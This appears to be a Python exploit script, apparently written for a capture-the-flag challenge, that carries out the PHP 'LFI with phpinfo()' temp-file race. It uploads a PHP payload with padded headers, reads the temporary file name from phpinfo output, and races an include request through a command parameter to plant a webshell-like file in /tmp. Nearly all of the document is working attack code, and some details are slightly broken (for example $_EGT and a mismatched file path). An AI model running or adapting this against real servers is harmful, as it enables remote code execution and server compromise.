#!/usr/bin/env pyhon
# -*-coding: utf-8 -*-

"""
php 处理脚本执行完后再删除临时文件，间隔时间极短
"""

import sys
import threading
import socket
import logging
from argparse import ArgumentParser

logging.basicConfig(level=logging.DEBUG)
log = logging.getLogger(__name__)


def setup(host, port):

    tag = "Security Test"
    boundary = '---------------------------11008921013555437861019615112'
    php_path = ''
    payload = "{tag}\r\n".format(tag=tag)
    payload += '<?php $c=fopen("/tmp/vgc", "w");fwrite($c, \'<?php file_put_content($_EGT["f"],$_EGT["c"]);?>\');?>'
    req_data = '--{b}\r\n'.format(b=boundary)
    req_data += 'Content-Disposition: form-data; name="file"; filename="file.txt"\r\n'
    req_data += 'Content-Type: text/plain\r\n'
    req_data += '\r\n'
    req_data += '{payload}\r\n'.format(payload=payload)
    req_data += '--{b}--'.format(b=boundary)

    # padding for delay php server delete tmp file
    # 这种方式是phpinfo返回发送的头信息，信息过大的话就采用分块传输，padding增加了传输时间,根据需要改
    padding = 'A' * 8000

    req = 'POST {path}/?cmd=print_r(call_user_func(array_pop(apache_request_headers())));&a={padding} HTTP/1.1\r\n'.format(
        path=php_path, padding=padding)
    req += 'Host: {host}:{port}\r\n'.format(host=host, port=port)
    req += 'Cookie: othercookie={padding}\r\n'.format(padding=padding)
    req += 'User-Agent: {padding}\r\n'.format(padding=padding)
    #req += 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n'
    req += 'Accept: {padding}\r\n'.format(padding=padding)
    req += 'Accept-Language: {padding}\r\n'.format(padding=padding)
    req += 'Accept-Encoding: {padding}\r\n'.format(padding=padding)
    req += 'Content-Type: multipart/form-data; boundary={b}\r\n'.format(
        b=boundary)
    req += 'Content-Length: {l}\r\n'.format(l=len(req_data))
    req += 'Connection: close\r\n'
    req += 'T: phpinfo\r\n'
    req += '\r\n'
    req += '{data}'.format(data=req_data)

    # modify this to suit the LFI script
    lfi_req = 'GET /?cmd=print_r(include_once(array_pop(apache_request_headers()))); HTTP/1.1\r\n'
    lfi_req += 'Connection: close\r\n'
    # lfi_req += 'Connection: Keep-alive\r\n'
    lfi_req += 'Host: %s\r\n'
    lfi_req += 'T: %s\r\n'
    lfi_req += '\r\n'

    return (req, tag, lfi_req)


def lfi_phpinfo(host, port, phpinfo_req, offset, lfi_req, tag):
    s1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s1.connect((host, port))
    s2.connect((host, port))

    s1.sendall(phpinfo_req)
    data = ""
    while len(data) < offset:
        data += s1.recv(offset)

    try:
        index = data.index("[tmp_name] =&gt;")
        fn = data[index+17: index+31]
    except ValueError as e:
        err_msg = "fetch temp file path error: {e}".format(e=e)
        log.error(err_msg)
        return None

    print(lfi_req % (
        '61a1d20417ff3173fde4ba8aab4b0a7279f0b37e.sandbox.r-cursive.ml:1337', fn))

    s2.sendall(lfi_req % (
        '61a1d20417ff3173fde4ba8aab4b0a7279f0b37e.sandbox.r-cursive.ml:1337', fn))

    data = s2.recv(4096)

    # debug
    log.debug(data)

    s1.close()
    s2.close()

    if data.find(tag) != -1:
        return fn


counter = 0


class ThreadWorker(threading.Thread):

    def __init__(self, event, lock, maxattempts, *args):
        threading.Thread.__init__(self)
        self.event = event
        self.lock = lock
        self.maxattempts = maxattempts
        self.args = args

    def run(self):
        global counter
        while not self.event.is_set():
            with self.lock:
                if counter >= self.maxattempts:
                    return
                counter += 1

            try:
                x = lfi_phpinfo(*self.args)
                if self.event.is_set():
                    break
                if x:
                    info_msg = "\nGot it! Shell created in /tmp/g"
                    log.info(info_msg)
                    self.event.set()
            except socket.error:
                return


def getoffset(host, port, phpinfo_req):
    """Gets offset of tmp_name in php output
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.sendall(phpinfo_req)

    # print(phpinfo_req)

    data = ""
    while True:
        rcv_data = s.recv(4096)
        data += rcv_data
        if rcv_data == "":
            break
        # detect the final chunk
        if rcv_data.endswith("0\r\n\r\n"):
            break
    s.close()

    # print(data)

    # debug
    # log.debug(data)

    index = data.find("[tmp_name] =&gt;")
    if index == -1:
        raise ValueError("No php tmp_name in phpinfo output")

    info_msg = "found {file} at {index}".format(
        file=data[index:index+10], index=index)
    log.info(info_msg)

    # padded up a bit
    return index+256


def main():

    banner = "LFI with phpinfo()\n"
    banner += "=" * 30
    print(banner)

    usage = "python {prog} host [port] [threads]. -h for help".format(
        prog=sys.argv[0])

    parser = ArgumentParser(usage=usage)
    parser.add_argument('host', help="ip or domain, e.g. 127.0.0.1")
    parser.add_argument('-p', dest='port', type=int, default=1337,
                        help="port, default is 80")
    parser.add_argument('-t', dest='threads', type=int, default=10,
                        help="use n threads to access, default is 10")
    args = parser.parse_args()

    host = args.host
    _host = host
    port = args.port
    poolsz = args.threads

    try:
        host = socket.gethostbyname(sys.argv[1])
    except socket.error as e:
        err_msg = "Error with hostname {h}:{err}".format(h=sys.argv[1], err=e)
        log.error(err_msg)
        sys.exit(1)

    info_msg = "Getting initial offset ..."
    log.info(info_msg)

    req, tag, lfi_req = setup(_host, port)

    #debug_msg = '\n\n'.join([req, tag, lfi_req])
    # log.debug(debug_msg)

    offset = getoffset(host, port, req)

    sys.stdout.flush()

    maxattempts = 500
    event = threading.Event()
    lock = threading.Lock()

    tp = []

    for i in range(poolsz):
        tp.append(ThreadWorker(event, lock, maxattempts,
                               host, port, req, offset, lfi_req, tag))

    for t in tp:
        t.start()

    try:
        while not event.wait(0.5):
            if event.is_set():
                break
            with lock:
                sys.stdout.write("\r\n% 4d / % 4d\n" % (counter, maxattempts))
                sys.stdout.flush()
                if counter >= maxattempts:
                    break

        if event.is_set():
            info_msg = "Wowo! \m/"
        else:
            info_msg = ":("
        log.info(info_msg)

    except KeyboardInterrupt:
        info_msg = "\nTelling threads to shutdown..."
        log.info(info_msg)
        event.set()

    info_msg = "Shutting down..."
    log.info(info_msg)

    for t in tp:
        t.join()


if __name__ == "__main__":
    main()
